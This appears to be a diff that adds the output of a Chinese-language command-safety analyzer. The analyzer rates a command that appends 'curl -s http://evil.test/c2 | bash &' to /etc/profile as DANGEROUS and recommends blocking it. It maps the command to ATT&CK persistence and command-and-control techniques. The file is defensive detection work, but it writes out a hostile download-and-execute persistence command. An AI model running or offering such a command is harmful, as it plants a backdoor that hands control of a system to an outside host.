@@ -1,0 +1,13 @@
+🚨 判定: DANGEROUS (风险分: 100/100, 置信度: HIGH)
+命令: echo 'curl -s http://evil.test/c2 | bash &' >> /etc/profile
+
+发现 4 个问题 (2 严重, 2 警告):
+  [CRITICAL] 文件变更: 敏感路径写入: ['/etc/profile'] [T1222.002]
+  [CRITICAL] 内容分析: Shell 配置含恶意内容: download and execute (curl|sh) [T1105]
+  [WARN] 静态分析: 命令匹配恶意模式: download and execute (curl|sh) [T1105]
+  [WARN] Shell环境: Shell 配置文件被修改 [T1546.004]
+
+涉及 ATT&CK 战术: Command and Control, Persistence, Unknown
+
+建议:
+  • BLOCK: 强烈建议阻止此命令执行
